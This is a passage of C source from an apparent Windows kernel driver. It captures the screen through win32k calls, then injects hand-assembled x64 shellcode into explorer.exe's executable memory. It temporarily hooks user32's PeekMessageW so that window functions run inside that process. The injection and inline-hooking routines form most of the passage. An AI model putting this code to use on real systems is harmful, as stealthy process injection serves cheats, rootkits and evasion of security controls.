		LOG_DEBUG("NtUserPostMessage  r %08X\n", Arg->r);
	}
	else if (Arg->Type == ARG_NtUserEnumDisplaySettings)
	{
		if (Win32k_NtUserEnumDisplaySettings != 0) {
			PVOID addr = 0;
			size_t size = sizeof(DEVMODEW) + 0x100;
			NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
			LOG_DEBUG("NtUserEnumDisplaySettings  r %08X\n", Arg->r);
			if (NT_SUCCESS(status))
			{
				DEVMODEW* pSeting = addr;
				RtlZeroMemory(addr, sizeof(DEVMODEW));
				pSeting->dmSize = sizeof(DEVMODEW);
				pSeting->dmDriverExtra = 0;

				NTSTATUS r = Win32k_NtUserEnumDisplaySettings(NULL, -1, pSeting, 0);
				LOG_DEBUG("NtUserEnumDisplaySettings  r %08X\n", r);
				if (r >= 0) {
					RtlCopyMemory(Arg->Ptr, pSeting, sizeof(DEVMODEW));
					Arg->r = 1;
				}
				//size = 0;
				ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
			}

		}
	}
	else if (Arg->Type == ARG_PICTURE)
	{
		HDC screenDc = Win32k_NtUserGetDC(0);
		LOG_DEBUG("HDC %I64X\n", screenDc);
		HDC MemDc = Win32k_NtGdiCreateCompatibleDC(screenDc);
		LOG_DEBUG("MemDc %I64X\n", MemDc);
		if (screenDc != 0 && MemDc != 0) {
			//DEVMODEW DisPlaySeting = { 0 };
			//if (GetDisplaySettings(&DisPlaySeting)){

			//	//ReleaseDC
			//} 
			HBITMAP hBitmap = Win32k_NtGdiCreateCompatibleBitmap(screenDc, Arg->With, Arg->Height);
			LOG_DEBUG("hBitmap %I64X\n", MemDc);
			HGDIOBJ hOldBMP = Win32k_NtGdiSelectBitmap(MemDc, hBitmap);
			LOG_DEBUG("hOldBMP  %I64X\n", hOldBMP);
			NTSTATUS r = Win32k_NtGdiBitBlt(MemDc, 0, 0, Arg->With, Arg->Height, screenDc, Arg->P.x, Arg->P.y, (DWORD)0x00CC0020, -1, 0);
			LOG_DEBUG("Win32k_NtGdiBitBlt r %I64X\n", r);

			PVOID addr = 0;


			DWORD BmpSize = Arg->With * Arg->Height * 4;

			size_t size = BmpSize;
			NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
			//LOG_DEBUG("ARG_PICTURE  r %08X\n", Arg->r);
			if (NT_SUCCESS(status))
			{
				RtlZeroMemory(addr, size);
				//RtlZeroMemory(Arg->Ptr, size);
				r = Win32k_NtGdiGetBitmapBits(hBitmap, size, addr);
				LOG_DEBUG("Win32k_NtGdiGetBitmapBits r %I64X   %I64X  %I64X   Size:%d\n", r, Arg->Ptr, addr, size);
				RtlCopyMemory(Arg->Ptr, addr, size);
				LOG_DEBUG("Win32k_NtGdiGetBitmapBits r %I64X\n", r);
				//size = 0;
				ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
				Arg->r = BmpSize;
			}
			Win32k_NtGdiSelectBitmap(MemDc, hOldBMP);
		}
		LOG_DEBUG("Win32k_NtUserReleaseDC\n");
		Win32k_NtUserReleaseDC(MemDc);
		LOG_DEBUG("Win32k_NtUserReleaseDC\n");
		Win32k_NtUserReleaseDC(screenDc);
		LOG_DEBUG("Win32k_NtUserReleaseDC\n");
	}
	else if (Arg->Type == ARG_NtUserSetWindowLongPtr) {
	     Arg->r = Win32k_NtUserSetWindowLongPtr(Arg->Hwnd, Arg->Msg.lParam, Arg->Msg.wParam, 0);
    }


	WriteCR8(PASSIVE_LEVEL);
	KeSetEvent(&Arg->Notify, LOW_PRIORITY, FALSE);
	WriteCR8(irql);
}


NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);


void RunApcUser(PKAPC Apc, PKNORMAL_ROUTINE NormalRoutine, PVOID NormalContext,
	PVOID SystemArgument1, PVOID SystemArgument2) {

	//LOG_DEBUG("%s\n", PsGetProcessImageFileName(PsGetCurrentProcess()));

	LOG_DEBUG("...............\n");
	RUN_APC_ARG* Arg = (RUN_APC_ARG*)(*(PUINT_PTR)SystemArgument1);
	//if (Arg->Type == ARG_NtUserFindWindowEx) {
	//	//LoadMemoryToUser()

	//	LOG_DEBUG("%wZ  %wZ\n", Arg->lpClassName, Arg->lpWindowName);
	//	//Arg->Hwnd = Win32k_NtUserFindWindowEx(0i64, 0i64, &UserClassName, &UserWindowName, 0);
	//	if (Arg->_FindWindowW != 0)
	//	{
	//		LOG_DEBUG("FindWindowW ....\n");
	//		//Arg->Hwnd = Win32k_NtUserFindWindowEx(Arg->lpClassName->Buffer, Arg->lpWindowName->Buffer);
	//	}
	//	else
	//	{
	//		Arg->Hwnd = 0;
	//	}
	//}


	//KeLowerIrql(irql);
	// 提供的内存一定是Useer

	//LOG_DEBUG("arg:<%p>\n", Arg);
	////LOG_DEBUG("arg:<%p>\n", *(RUN_APC_ARG*)Arg);

	//LOG_DEBUG("RunApc\n");
	//LOG_DEBUG("%wZ  %wZ\n", Arg->lpClassName, Arg->lpWindowName);
	//Arg->Hwnd = Win32k_NtUserFindWindowEx(0i64, 0i64, Arg->lpClassName, Arg->lpWindowName, 0);

	//LOG_DEBUG("RunApc %08X\n", Arg->Hwnd);
	//if (Win32k_NtUserGetForegroundWindow != 0)
	//{
	//	Arg->Hwnd = Win32k_NtUserGetForegroundWindow();
	//	LOG_DEBUG("RunApc %08X\n", Arg->Hwnd);
	//}
	//if (Win32k_NtUserCallHwndLock != 0) {

	//	DWORD R = Win32k_NtUserCallHwndLock(0, SET_FORE_WINDW);
	//	LOG_DEBUG("RunApc %08X %d\n", Arg->Hwnd, R);
	//	R = Win32k_NtUserCallHwndLock(Arg->Hwnd, SET_FORE_WINDW);
	//	LOG_DEBUG("RunApc %08X %d\n", Arg->Hwnd, R);
	//}
	//LOG_DEBUG("RunApc %08X\n", Arg->Hwnd);
	KeSetEvent(&Arg->Notify, LOW_PRIORITY, FALSE);
}





//HWND __stdcall FindWindowW(LPCWSTR lpClassName, LPCWSTR lpWindowName)
//{
//	struct _UNICODE_STRING DestinationString; // [rsp+30h] [rbp-40h] BYREF
//	struct _UNICODE_STRING* p_DestinationString; // [rsp+40h] [rbp-30h]
//	int v6; // [rsp+48h] [rbp-28h]
//	struct _UNICODE_STRING v7; // [rsp+50h] [rbp-20h] BYREF
//	__int128 v8; // [rsp+60h] [rbp-10h]
//
//	v6 = 0;
//	p_DestinationString = &DestinationString;
//	v7 = 0i64;
//	v8 = 0i64;
//	if (((unsigned __int64)lpClassName & 0xFFFFFFFFFFFF0000ui64) != 0)
//	{
//		RtlInitUnicodeString(&DestinationString, lpClassName);
//	}
//	else
//	{
//		*(DWORD*)&DestinationString.Length = 0;
//		DestinationString.Buffer = (PWSTR)lpClassName;
//	}
//	DWORD2(v8) = 0;
//	*(_QWORD*)&v8 = &v7;
//	RtlInitUnicodeString(&v7, lpWindowName);
//	return (HWND)NtUserFindWindowEx(0i64, 0i64, p_DestinationString, v8, 0);
//}




char PushAll[] = { 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55,
				  0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57 };

char PopAll[] = { 0x41,0x5F,  0x41,0x5E, 0x41,0x5D, 0x41,0x5C, 0x41,0x5B, 0x41,0x5A, 0x41,0x59, 0x41,0x58,
				  0x5D , 0x5F , 0x5E , 0x5A  ,0x59 ,0x5B, 0x58 };




//0342081F - 66 0F7F 00 - movdqa[rax], xmm0
//03420823 - 66 0F7F 48 10 - movdqa[rax + 10], xmm1
//03420828 - 66 0F7F 50 20 - movdqa[rax + 20], xmm2
//0342082D - 66 0F7F 58 30 - movdqa[rax + 30], xmm3
//03420832 - 66 0F7F 60 40 - movdqa[rax + 40], xmm4
//03420837 - 66 0F7F 68 50 - movdqa[rax + 50], xmm5
//0342083C - 66 0F7F 70 60 - movdqa[rax + 60], xmm6
//03420841 - 66 0F7F 78 70 - movdqa[rax + 70], xmm7
//03420846 - 66 44 0F7F 80 80000000 - movdqa[rax + 00000080], xmm8
//0342084F - 66 44 0F7F 88 90000000 - movdqa[rax + 00000090], xmm9
//03420858 - 66 44 0F7F 90 A0000000 - movdqa[rax + 000000A0], xmm10
//03420861 - 66 44 0F7F 98 B0000000 - movdqa[rax + 000000B0], xmm11
//0342086A - 66 44 0F7F A0 C0000000 - movdqa[rax + 000000C0], xmm12
//03420873 - 66 44 0F7F A8 D0000000 - movdqa[rax + 000000D0], xmm13
//0342087C - 66 44 0F7F B0 E0000000 - movdqa[rax + 000000E0], xmm14
//03420885 - 66 44 0F7F B0 F0000000 - movdqa[rax + 000000F0], xmm14



char  xmm0_15[] = { 0x66, 0x0F, 0x7F, 0x00,
0x66, 0x0F, 0x7F, 0x48, 0x10,
0x66, 0x0F, 0x7F, 0x50, 0x20,
0x66, 0x0F, 0x7F, 0x58, 0x30,
0x66, 0x0F, 0x7F, 0x60, 0x40,
0x66, 0x0F, 0x7F, 0x68, 0x50,
0x66, 0x0F, 0x7F, 0x70, 0x60,
0x66, 0x0F, 0x7F, 0x78, 0x70,
0x66, 0x44, 0x0F, 0x7F, 0x80, 0x80, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x7F, 0x88, 0x90, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x7F, 0x90, 0xA0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x7F, 0x98, 0xB0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x7F, 0xA0, 0xC0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x7F, 0xA8, 0xD0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x7F, 0xB0, 0xE0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x7F, 0xB8, 0xF0, 0x00, 0x00, 0x00 };



char  xmm0_15_r[] = { 0x66, 0x0F, 0x6F, 0x00,
0x66, 0x0F, 0x6F, 0x48, 0x10,
0x66, 0x0F, 0x6F, 0x50, 0x20,
0x66, 0x0F, 0x6F, 0x58, 0x30,
0x66, 0x0F, 0x6F, 0x60, 0x40,
0x66, 0x0F, 0x6F, 0x68, 0x50,
0x66, 0x0F, 0x6F, 0x70, 0x60,
0x66, 0x0F, 0x6F, 0x78, 0x70,
0x66, 0x44, 0x0F, 0x6F, 0x80, 0x80, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x6F, 0x88, 0x90, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x6F, 0x90, 0xA0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x6F, 0x98, 0xB0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x6F, 0xA0, 0xC0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x6F, 0xA8, 0xD0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x6F, 0xB0, 0xE0, 0x00, 0x00, 0x00,
0x66, 0x44, 0x0F, 0x6F, 0xB8, 0xF0, 0x00, 0x00, 0x00 };


//// movdqa [00000000],xmm0
//char xmm0_7[]= { 0x66, 0x0F, 0x7F, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x7F, 0x0C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x7F, 0x14, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x7F, 0x1C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x7F, 0x24, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x7F, 0x2C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x7F, 0x34, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x7F, 0x3C, 0x25, 0x00, 0x00, 0x00, 0x00 };
//
//// movdqa xmm0,[00000000]
//char xmm0_7_r[] = { 0x66, 0x0F, 0x6F, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x6F, 0x0C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x6F, 0x14, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x6F, 0x1C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x6F, 0x24, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x6F, 0x2C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x6F, 0x34, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x0F, 0x6F, 0x3C, 0x25, 0x00, 0x00, 0x00, 0x00 };
//
//// movdqa [00000000],xmm8
//char xmm8_15[] = { 0x66, 0x44, 0x0F, 0x7F, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x7F, 0x0C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x7F, 0x14, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x7F, 0x1C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x7F, 0x24, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x7F, 0x2C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x7F, 0x34, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x7F, 0x3C, 0x25, 0x00, 0x00, 0x00, 0x00 };
//
//// movdqa xmm8,[00000000]
//char xmm8_15_r[] = { 0x66, 0x44, 0x0F, 0x6F, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x6F, 0x0C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x6F, 0x14, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x6F, 0x1C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x6F, 0x24, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x6F, 0x2C, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x6F, 0x34, 0x25, 0x00, 0x00, 0x00, 0x00,
//			   0x66, 0x44, 0x0F, 0x6F, 0x3C, 0x25, 0x00, 0x00, 0x00, 0x00 };
			 //  0x66, 0x44, 0x0F, 0x7F, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00, 0x66, 0x44, 0x0F, 0x7F, 0x0C, 0x25}




LONG_PTR SetWindowLongPtrA(
	HWND     hWnd,
	int      nIndex,
	LONG_PTR dwNewLong
) {





	return 0;
}

NTKERNELAPI NTSTATUS PsSuspendProcess(PEPROCESS pProcessObject);
NTKERNELAPI NTSTATUS PsResumeProcess(PEPROCESS pProcessObject);


char BeginPeek[] = { 0x48, 0x89, 0x5C , 0x24 , 0x08 , 0x48 , 0x89 , 0x6C , 0x24 , 0x10 , 0x48 , 0x89 , 0x74 , 0x24 , 0x18 };



extern  fPspCreateThread TruePspCreateThread;

_Kernel_entry_ NTSTATUS PsGetContextThread(PETHREAD Ethread, CONTEXT* pConText, char Mod);
NTKERNELAPI NTSTATUS PsSuspendProcess(PEPROCESS pProcessObject);
NTKERNELAPI NTSTATUS PsResumeProcess(PEPROCESS pProcessObject);




//ClientToScreen















UINT  ClientToScreen_User(HWND Hwnd, LPPOINT lpPoint)
{
	LOG_DEBUG("%08X ,<%p>  %d  %d\n", Hwnd, lpPoint, lpPoint->x, lpPoint->y);
	PEPROCESS eprocess;
	HANDLE dwPID_Explorer = Get_Win32k_Process_Explorer();
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		LOG_DEBUG("%08X ,<%p>\n", Hwnd, lpPoint);
		KAPC_STATE Apc_State;
		KeStackAttachProcess(eprocess, &Apc_State);


		MEM_LIST_PID mMemory = { 0 };
		PVOID addr = 0;
		if (ExChangeMem(1, &mMemory, dwPID_Explorer) == 0) {
			size_t size = PAGE_SIZE * 2;
			NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!NT_SUCCESS(status)) {
				KeUnstackDetachProcess(&Apc_State);
				ObDereferenceObject(eprocess);
				return status;
			}
			mMemory.addr = addr;
			mMemory.dwPID = dwPID_Explorer;
			mMemory.size = size;
		}
		else {
			addr = mMemory.addr;
			RtlZeroMemory(addr, mMemory.size);
		}


		char* ExeCode = 0;
		DWORD* nExeSucess = 0;

		LOG_DEBUG("%08X ,<%p>\n", Hwnd, lpPoint);
		if (addr != 0)
		{

			LOG_DEBUG("< %p >\n", addr);

			RtlZeroMemory(addr, PAGE_SIZE * 2);
			char* _Begin = (char*)addr;
			wchar_t* pUserClassName = (wchar_t*)_Begin;
			LPPOINT pUserWindowsName = (LPPOINT)(_Begin + 0x200);


			pUserWindowsName->x = lpPoint->x;
			pUserWindowsName->y = lpPoint->y;


			HWND* pHwnd =  (HWND *)(_Begin + 0x400);
			nExeSucess = (DWORD *)(_Begin + 0x500);

			char* pFun = _Begin + 0x600;

			DWORD64 _bClientToScreen = 0;

			DWORD64 PeekMessageW = 0;


			if (mMemory._GetWindwRect == 0)
			{
				UNICODE_STRING uUser32;
				RtlInitUnicodeString(&uUser32, L"user32.dll");
				DWORD64 Mod_User32 = GetModuleBaseWow64_Self(uUser32);
				if (Mod_User32 != 0)
				{
					_bClientToScreen = (DWORD64)GetProcAddress_Kernel((PVOID)Mod_User32, "ClientToScreen");
					LOG_DEBUG(" ClientToScreen <%p>\n", _bClientToScreen);

					PeekMessageW = (DWORD64)GetProcAddress_Kernel((PVOID)Mod_User32, "PeekMessageW");

					LOG_DEBUG(" PeekMessageW <%p>\n", PeekMessageW);

					mMemory._PeekMessageW = PeekMessageW;

					mMemory._ClientToScreen = _bClientToScreen;

				}
			}
			else
			{
				_bClientToScreen = mMemory._ClientToScreen;
				PeekMessageW = mMemory._PeekMessageW;

			}



			if (_bClientToScreen == 0 || PeekMessageW == 0)
			{
				LOG_DEBUG("Err __bClientToScreen<%p>  PeekMessageW <%p>\n", _bClientToScreen, PeekMessageW);
				KeUnstackDetachProcess(&Apc_State);
				ObDereferenceObject(eprocess);
				return 1;
			}


			*((DWORD64*)pFun) = _bClientToScreen;

			//MAKE_BEGIN

			ExeCode = _Begin + 0x800;
			char* xmmCode = _Begin + PAGE_SIZE;
			//LOG_DEBUG("< %p >\n", ExeCode);
			//char Buffer[0x200] = {0};
			char* pCode = ExeCode;


			//MAKE_BEGIN

			RtlCopyMemory(pCode, PushAll, sizeof(PushAll));
			pCode += sizeof(PushAll);

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)xmmCode;
			pCode += 10;

			RtlCopyMemory(pCode, xmm0_15, sizeof(xmm0_15));
			pCode += sizeof(xmm0_15);

			pCode[0] = (char)0x66;
			pCode[1] = (char)0x9C;
			pCode += 2;



			//----------------------------------------
			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)nExeSucess;
			pCode += 10;

			pCode[0] = (char)0x83;
			pCode[1] = (char)0x38;
			pCode[2] = (char)0x01;
			pCode += 3;


			pCode[0] = (char)0x0F;
			pCode[1] = (char)0x84;
			char* Jeoffset = &pCode[2];
			pCode += 6;

			pCode[0] = (char)0x48;
			pCode[1] = (char)0x83;
			pCode[2] = (char)0xEC;
			pCode[3] = (char)0x48;
			pCode += 4;

			//pCode[0] = (char)0xC7;
			//pCode[1] = (char)0x44;
			//pCode[2] = (char)0x24;
			//pCode[3] = (char)0x20;
			//*((DWORD*)&pCode[4]) = pMouseEvent->dwExtraInfo;
			//pCode += 8;


			//pCode[0] = (char)0x49; /// MOV r9
			//pCode[1] = (char)0xB9;
			//*((DWORD64*)&pCode[2]) = (DWORD64)pMouseEvent->dwData;
			//pCode += 10;

			//pCode[0] = (char)0x49; /// MOV r8
			//pCode[1] = (char)0xB8;
			//*((DWORD64*)&pCode[2]) = (DWORD64)pMouseEvent->dy;
			//pCode += 10;

			pCode[0] = (char)0x48; /// MOV RDX
			pCode[1] = (char)0xBA;
			*((DWORD64*)&pCode[2]) = (DWORD64)pUserWindowsName;
			pCode += 10;

			pCode[0] = (char)0x48; // MOV RCX
			pCode[1] = (char)0xB9;
			*((DWORD64*)&pCode[2]) = (DWORD64)Hwnd;
			pCode += 10;

			pCode[0] = (char)0xFF;
			pCode[1] = (char)0x15;
			*((DWORD*)&pCode[2]) =  (DWORD)((INT64)pFun - (INT64)pCode - 6);
			pCode += 6;

			pCode[0] = (char)0xA3;
			*((DWORD64*)&pCode[1]) = (DWORD64)pHwnd;
			pCode += 9;

			pCode[0] = (char)0x48;
			pCode[1] = (char)0x83;
			pCode[2] = (char)0xC4;
			pCode[3] = (char)0x48;
			pCode += 4;


			char* JeCode = pCode;
			//-------------    这是跳转CALL
			*((DWORD*)Jeoffset) =  (DWORD)(JeCode - Jeoffset - 4);


			pCode[0] = (char)0x66;
			pCode[1] = (char)0x9D;
			pCode += 2;


			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)xmmCode; // MOV RAX,
			pCode += 10;

			RtlCopyMemory(pCode, xmm0_15_r, sizeof(xmm0_15_r));
			pCode += sizeof(xmm0_15_r);

			RtlCopyMemory(pCode, PopAll, sizeof(PopAll));
			pCode += sizeof(PopAll);

			RtlCopyMemory(pCode, BeginPeek, sizeof(BeginPeek));
			pCode += sizeof(BeginPeek);

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)nExeSucess;
			pCode += 10;

			pCode[0] = (char)0xC7;
			pCode[1] = (char)0x00;
			*((DWORD*)&pCode[2]) = 1;
			pCode += 6;


			//nExeSucess = pCode + 3;
			pCode[0] = (char)0x48;
			pCode[1] = (char)0xFF;
			pCode[2] = (char)0x25;
			*((DWORD*)&pCode[3]) = 0;
			*((DWORD64*)&pCode[7]) = PeekMessageW + 15;



			char JMP_NEW[15] = { 0 };

			JMP_NEW[0] = (char)0x48;
			JMP_NEW[1] = (char)0xFF;
			JMP_NEW[2] = (char)0x25;

			*((DWORD*)&JMP_NEW[3]) = 0;
			*((DWORD64*)&JMP_NEW[7]) = (DWORD64)ExeCode;



			HANDLE  tid = GetPrccessFirstThreadID(eprocess);
			LOG_DEBUG("Thread ID:<%p>\n", tid);
			PETHREAD Ethread = 0;
			if (NT_SUCCESS(PsLookupThreadByThreadId(tid, &Ethread)))
			{
				PsSuspendProcess(eprocess);
				PETHREAD ArryEthread[256] = { 0 };
				BOOLEAN nKeg = 1;
				CONTEXT* pConText =  (CONTEXT*)(_Begin + 0x1800);
				ULONG nSize = 0x10;
				ULONG uProtect = 0;
				while (nKeg)
				{
					int tSize = EnumProcessThread(eprocess, ArryEthread);
					for (size_t i = 0; i < tSize; i++)
					{
						NTSTATUS status = PsGetContextThread(ArryEthread[i], pConText, UserMode);
						if (pConText->Rip >= PeekMessageW && pConText->Rip < (PeekMessageW + 10))
						{
							break;
						}
						nKeg = 0;
					}
					if (nKeg)
					{
						PsResumeProcess(eprocess);
						wSleepNs(1000);
						PsSuspendProcess(eprocess);
						continue;
					}
					//writeSafeMemory(PeekMessageW, JMP_NEW, sizeof(JMP_NEW));

					DWORD64 gzPeekMessageW = PeekMessageW;

					ULONGLONG nSize = 0x10;
					ULONG uProtect = 0;

					if (!NT_SUCCESS(ZwProtectVirtualMemory(ZwCurrentProcess(), (PVOID *)&gzPeekMessageW, &nSize, PAGE_EXECUTE_READWRITE, &uProtect)))
					{
						//ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_DECOMMIT);
						KeUnstackDetachProcess(&Apc_State);
						ObDereferenceObject(Ethread);
						ObDereferenceObject(eprocess);
						return 2;
					}
					//pHyAddress = MmGetPhysicalAddress(PeekMessageW);
					//LOG_DEBUG("pHyAddress <%p>\n", pHyAddress.QuadPart);

					RtlCopyMemory((PVOID)PeekMessageW, JMP_NEW, sizeof(JMP_NEW));
					//writeSafeMemory(PeekMessageW, JMP_NEW, sizeof(JMP_NEW));
					break;
				}
				PsResumeProcess(eprocess);

				while (*nExeSucess != 1) {
					wSleepNs(1);
				}

				PsSuspendProcess(eprocess);
				nKeg = 1;
				while (nKeg)
				{
					int tSize = EnumProcessThread(eprocess, ArryEthread);
					for (size_t i = 0; i < tSize; i++)
					{
						NTSTATUS status = PsGetContextThread(ArryEthread[i], pConText, UserMode);
						if (pConText->Rip >= PeekMessageW && pConText->Rip < (PeekMessageW + 10))
						{
							break;
						}
						nKeg = 0;
					}
					if (nKeg)
					{
						PsResumeProcess(eprocess);
						wSleepNs(1000);
						PsSuspendProcess(eprocess);
						continue;
					}
					RtlCopyMemory((PVOID)PeekMessageW, BeginPeek, sizeof(BeginPeek));
					//writeSafeMemory(PeekMessageW, BeginPeek, sizeof(BeginPeek));
					break;
				}
				PsResumeProcess(eprocess);
				ObDereferenceObject(Ethread);
			}
			RtlCopyMemory(lpPoint, pUserWindowsName, sizeof(POINT));
			LOG_DEBUG("< lpPoint x %d y %d >\n", lpPoint->x, lpPoint->y);
			//ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_DECOMMIT);
			ExChangeMem(0, &mMemory, dwPID_Explorer);
			KeUnstackDetachProcess(&Apc_State);
			ObDereferenceObject(eprocess);
			return 0;

		}
		KeUnstackDetachProcess(&Apc_State);
		ObDereferenceObject(eprocess);
		return 3;
	}
	else
	{
		LOG_DEBUG("PsLookupProcessByProcessId  Error\n");
	}
	return 4;
}

UINT  GetWindowRect_User(HWND Hwnd, LPRECTK lpRect)
{
	LOG_DEBUG("%08X ,<%p>\n", Hwnd, lpRect);
	PEPROCESS eprocess;
	HANDLE dwPID_Explorer = Get_Win32k_Process_Explorer();
	if (NT_SUCCESS(PsLookupProcessByProcessId(Get_Win32k_Process_Explorer(), &eprocess))) {

		LOG_DEBUG("%08X ,<%p>\n", Hwnd, lpRect);
		KAPC_STATE Apc_State;
		KeStackAttachProcess(eprocess, &Apc_State);


		MEM_LIST_PID mMemory = { 0 };
		PVOID addr = 0;
		if (ExChangeMem(1, &mMemory, dwPID_Explorer) == 0) {
		size_t size = PAGE_SIZE * 2;
			NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!NT_SUCCESS(status)) {
				KeUnstackDetachProcess(&Apc_State);
				ObDereferenceObject(eprocess);
				return status;
			}
			mMemory.addr = addr;
			mMemory.dwPID = dwPID_Explorer;
			mMemory.size = size;
		}
		else {
			addr = mMemory.addr;
			RtlZeroMemory(addr, mMemory.size);
		}






		char* ExeCode = 0;
		DWORD* nExeSucess = 0;

		LOG_DEBUG("%08X ,<%p>\n", Hwnd, lpRect);
		if (addr != 0)
		{

			LOG_DEBUG("< %p >\n", addr);

			RtlZeroMemory(addr, PAGE_SIZE * 2);
			char* _Begin = (char*)addr;
			wchar_t* pUserClassName = (wchar_t*)_Begin;
			LPRECTK pUserWindowsName = (LPRECTK)(_Begin + 0x200);
			HWND* pHwnd = (HWND *)(_Begin + 0x400);

			nExeSucess = (DWORD *)(_Begin + 0x500);

			char* pFun = _Begin + 0x600;

			_User32_FindWindowW _bGetWindowRect = 0;

			DWORD64 PeekMessageW = 0;



			if (mMemory._GetWindwRect == 0)
			{
				UNICODE_STRING uUser32;
				RtlInitUnicodeString(&uUser32, L"user32.dll");
				DWORD64 Mod_User32 = GetModuleBaseWow64_Self(uUser32);
				if (Mod_User32 != 0)
				{
					_bGetWindowRect = (_User32_FindWindowW)GetProcAddress_Kernel((PVOID)Mod_User32, "GetWindowRect");
					LOG_DEBUG(" GetWindowRect <%p>\n", _bGetWindowRect);

					PeekMessageW = (DWORD64)GetProcAddress_Kernel((PVOID)Mod_User32, "PeekMessageW");

					LOG_DEBUG(" PeekMessageW <%p>\n", PeekMessageW);

					mMemory._GetWindwRect = (DWORD64)_bGetWindowRect;
					mMemory._PeekMessageW = PeekMessageW;



				}
			}
			else
			{
				_bGetWindowRect = (_User32_FindWindowW)mMemory._GetWindwRect;
				PeekMessageW = mMemory._PeekMessageW;

			}



			if (_bGetWindowRect == 0 || PeekMessageW == 0)
			{
				LOG_DEBUG("Err __bGetWindowRect<%p>  PeekMessageW <%p>\n", _bGetWindowRect, PeekMessageW);
				KeUnstackDetachProcess(&Apc_State);
				ObDereferenceObject(eprocess);
				return 1;
			}


			*((DWORD64*)pFun) = (DWORD64)_bGetWindowRect;
			ExeCode = _Begin + 0x800;

			char* xmmCode = _Begin + PAGE_SIZE;

			LOG_DEBUG("< %p >\n", ExeCode);

			//char Buffer[0x200] = {0};
			char* pCode = ExeCode;


			//MAKE_BEGIN

			RtlCopyMemory(pCode, PushAll, sizeof(PushAll));
			pCode += sizeof(PushAll);

			pCode[0] = (char)0x48;
			pCode[1] = (char)0xB8;
			*((DWORD64*)&pCode[2]) = (DWORD64)xmmCode;
			pCode += 10;

